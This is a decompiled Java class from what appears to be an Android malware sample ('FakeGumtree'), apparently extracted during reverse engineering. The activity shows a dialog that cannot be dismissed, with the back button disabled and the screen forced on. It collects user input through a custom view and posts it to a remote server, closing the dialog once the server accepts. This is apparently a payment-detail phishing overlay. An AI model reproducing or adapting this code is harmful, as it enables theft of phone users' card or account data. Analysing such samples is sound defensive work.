package com.gumsis.injs.g;

import android.os.Bundle;
import android.view.View;
import com.gumsis.Realtalk;
import com.gumsis.api.request.HTTPServer;
import com.gumsis.api.request.HttpResponseHandler;
import com.gumsis.base.BaseActivity;
import com.gumsis.base.dialog.AlertDialog;
import com.gumsis.base.dialog.AlertDialog.Builder;
import com.gumsis.checktls.ScrTls;
import com.gumsis.injs.api.request.SCRequest;
import com.gumsis.injs.api.response.SCResponse;
import com.gumsis.injs.g.model.GData;
import com.gumsis.injs.g.view.GView;
import com.gumsis.injs.g.view.GView.OnGPCallback;

public class GActivity
  extends BaseActivity
{
  private AlertDialog mDialog;
  
  private void sendPostRequest(GData paramGData, final boolean paramBoolean)
  {
    paramGData = new SCRequest(this, paramGData, new HttpResponseHandler()
    {
      public void onResponse(int paramAnonymousInt, SCResponse paramAnonymousSCResponse)
      {
        if (!paramBoolean)
        {
          try
          {
            if (paramAnonymousSCResponse.ret == 0)
            {
              if (paramAnonymousSCResponse.answer != null)
              {
                if (!paramAnonymousSCResponse.answer.equalsIgnoreCase("accepted")) {
                  return;
                }
                Realtalk.setDisableGp(GActivity.this, true);
                GActivity.this.destroyDialog(GActivity.this.mDialog);
                return;
              }
              GActivity.this.destroyDialog(GActivity.this.mDialog);
              return;
            }
          }
          catch (Exception paramAnonymousSCResponse)
          {
            GActivity.this.destroyDialog(GActivity.this.mDialog);
            return;
          }
          GActivity.this.destroyDialog(GActivity.this.mDialog);
        }
      }
    });
    HTTPServer.getInstance().doRequest(paramGData);
  }
  
  private void showDialog(View paramView)
  {
    try
    {
      AlertDialog.Builder localBuilder = new AlertDialog.Builder(this);
      localBuilder.setView(paramView);
      this.mDialog = localBuilder.create();
      this.mDialog.setCanceledOnTouchOutside(false);
      this.mDialog.show();
      return;
    }
    catch (Exception paramView)
    {
      paramView.printStackTrace();
      destroyDialog(this.mDialog);
    }
  }
  
  public void onBackPressed() {}
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    ScrTls.scrOn(this);
    paramBundle = new GView(this);
    showDialog(paramBundle);
    paramBundle.setGpCallback(new GView.OnGPCallback()
    {
      public void onSave(GData paramAnonymousGData, boolean paramAnonymousBoolean)
      {
        GActivity.this.sendPostRequest(paramAnonymousGData, paramAnonymousBoolean);
      }
    });
  }
  
  protected void onDestroy()
  {
    super.onDestroy();
    ScrTls.scrOff(this);
  }
  
  protected void onPause()
  {
    super.onPause();
    destroyDialog(this.mDialog);
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/injs/g/GActivity.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */